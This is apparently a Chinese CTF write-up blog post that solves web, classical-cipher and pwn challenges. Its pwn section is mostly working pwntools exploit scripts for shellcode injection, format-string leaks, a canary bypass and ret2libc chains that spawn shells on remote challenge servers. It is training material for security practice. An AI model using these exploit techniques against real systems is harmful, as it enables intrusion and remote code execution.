+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.rcgjxlmdfxc.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.156e4evvp0dc.webp"></p>
+<h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><p>题目其实骗人的，真正的考点是目录穿越，我们可以以etc&#x2F;passwd进行查证</p>
+<p>我们先随意上传一个文件，他会让我们进行查看</p>
+<p>我们成功找到了穿越的地点</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6yf32v4l2k80.webp"></p>
+<p>然后我们在直接去访问flag，他提供了一个php文件，我们直接访问</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.66dmrtb4xdo0.webp"></p>
+<p>最后我们进行一下简单的md弱比较，就可以了</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7kikqsr971g0.webp"></p>
+<h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><p>php反序列化字符串逃逸</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical Crypto"></a>Classical Crypto</h1><h2 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h2><p>rot47解密</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.75dyzhgenmc0.webp"></p>
+<h2 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h2><p>栅栏密码，栏数为3</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2ban0s7byzrw.webp"></p>
+<h2 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h2><p>凯撒偏移为7</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.35v9q3am0wo0.webp"></p>
+<h2 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h2><p>这个形式一看就是凯撒或者维吉尼亚，不是凯撒就是维吉尼亚了</p>
+<p>我们先把密钥设置成moectf，解出开头goodjo的字符串</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.68bfyu9qv240.webp"></p>
+<p>所以我们猜测密钥是goodjob</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.710x6km40ns0.webp"></p>
+<h2 id="猫言喵语"><a href="#猫言喵语" class="headerlink" title="猫言喵语"></a>猫言喵语</h2><p>hit：Morse code</p>
+<p>喵喵？为长码，喵喵喵为短码直接解密即可</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1y2yk0m3v0v4.webp"></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h2><p>我们checksec发现保护全开，然后看他的题目描述是关于mmap和mprotect函数的，分析源码可以看到有两处关键的信息</p>
+<blockquote>
+<p>addr &#x3D; mmap(0LL, 0x64uLL, 3, 34, -1, 0LL);</p>
+</blockquote>
+<blockquote>
+<p>mprotect(addr, 0x1000uLL, 7);</p>
+</blockquote>
+<p>第二局的意思就是在这个以addr这个地址开始，0x1000字节的地址都是可读可写可执行的，然后他是在case4里的，那么就好办了，我们选择case4后直接传入shellcode就可以了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;....&#x27;</span>,<span class="number">55357</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成并汇编shellcode</span></span><br><span class="line">target = <span class="number">0x66660000</span></span><br><span class="line">payload = shellcode</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choose?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h3><p>我们可以看到内存分布，v2就在v1下面，那我们输入第一个函数就可以了，</p>
+<p>第二个传一个空值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;....&#x27;</span>,<span class="number">58343</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;age:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;key:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a@a:~/tools$ nc localhost <span class="number">58495</span></span><br><span class="line">Please <span class="built_in">input</span> your name:</span><br><span class="line">aaaaaaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">Your name <span class="keyword">is</span>: aaaaaaaaaaaa<span class="number">.0</span>xffbfeb7c<span class="number">.0</span>x50<span class="number">.0</span>x5663c362<span class="number">.0</span>xffbfeca4.(nil)<span class="number">.0</span>x3<span class="number">.0</span>x63656f6d<span class="number">.0</span>x6b7b6674<span class="number">.0</span>x37375254<span class="number">.0</span>x5a5a7268<span class="number">.0</span>x5a346d64<span class="number">.0</span>x44337530<span class="number">.0</span>x78786e2d<span class="number">.0</span>x42566d59<span class="number">.0</span>x77497752<span class="number">.0</span>x7d65596f<span class="number">.0</span>xa.(nil).(nil).(nil).(nil).(nil).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看到这些数据，将这些数据提取出来，然后去解码就能拿到flag，我们借用一个脚本一键做到</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;....&#x27;,58343)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">17</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;10.241.180.67&#x27;</span>,<span class="number">58495</span>)</span><br><span class="line">    p.sendline(<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"></span><br><span class="line">    byte_str = binascii.unhexlify(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    str_result = byte_str.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    flag+=str_result[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h2><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>模板套题，有点小问题是他用ubuntu22.04打不通，但用18.04可以打通</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;10.241.180.67&#x27;</span>,<span class="number">62836</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040117e</span></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006e1</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span>+<span class="number">8</span>)*<span class="string">b&#x27;a&#x27;</span> + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment">#将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，</span></span><br><span class="line"><span class="comment"># leak = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>) </span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload2 = (<span class="number">0x50</span>+<span class="number">8</span>)*<span class="string">b&#x27;a&#x27;</span> + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="pwn（03）"><a href="#pwn（03）" class="headerlink" title="pwn（03）"></a>pwn（03）</h3><p>分析源码，没有发现binsh字符串以及system函数，且开启了nx保护，看到pwnme（）函数中存在栈溢出，所以可以使用libc，具体思路为先泄露puts函数的真实地址，然后使用puts的真实地址确实libc版本，使用libcsearcher确定偏移等，最后或许shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28109)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./stack1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./stack1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*13 + p32(plt_addr) + p32(main_addr) + p32(got_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;\n\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(&quot;puts&quot;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27;*13 + p32(system_addr) + b&#x27;aaaa&#x27; +p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://uploader.shimo.im/f/ugqnlZvDfD07Ok7r.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>
+<h3 id="pwn-4"><a href="#pwn-4" class="headerlink" title="pwn(4)"></a>pwn(4)</h3><p>格式化字符串，难一点的做法</p>
+<p>&#96;<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39980610/article/details/126461902">ctfshow pwn4_ctfshow pwn04_whit233的博客-CSDN博客</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28106)</span><br><span class="line"># p = process(&#x27;ex2 (1)&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = 0x080485AF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = &#x27;%31$x&#x27;</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">canary = int(p.recv(8),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn（6）"><a href="#pwn（6）" class="headerlink" title="pwn（6）"></a>pwn（6）</h3><p>简单的栈溢出，主要练习64位的题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28110)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = 0x000000000040057B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400643</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*20 + p64(pop_rdi) + p64(system_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://uploader.shimo.im/f/xp4GMcBPmsv4tHpE.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>
+<h3 id="pwn（7）"><a href="#pwn（7）" class="headerlink" title="pwn（7）"></a>pwn（7）</h3><p>64位版的pwn（3），改一些数值就可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28112)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./stack1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004006e3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = 0x00000000004006e1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*20 + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) #将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(&quot;puts&quot;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret_addr = 0x00000000004004c6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27;*20 + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://uploader.shimo.im/f/LoBqZZI5JKEsHZTF.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>
+<h3 id="pwn（10）"><a href="#pwn（10）" class="headerlink" title="pwn（10）"></a>pwn（10）</h3><p>经典格式化字符串题目</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/anweilx/p/12693406.html">ctfshow—pwn10 - anweilx - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28104)</span><br><span class="line">#p = process(&quot;./pwn1&quot;)</span><br><span class="line">num_addr = 0x0804A030</span><br><span class="line">payload = p32(num_addr)+b&quot;aaaaaaaaaaaa%7$n&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://uploader.shimo.im/f/Ou6kePLwJWx3nIue.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0" alt="img"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/11/01/%E7%AE%80%E5%8E%86/" id="article-nav-newer" class="article-nav-link-wrap">
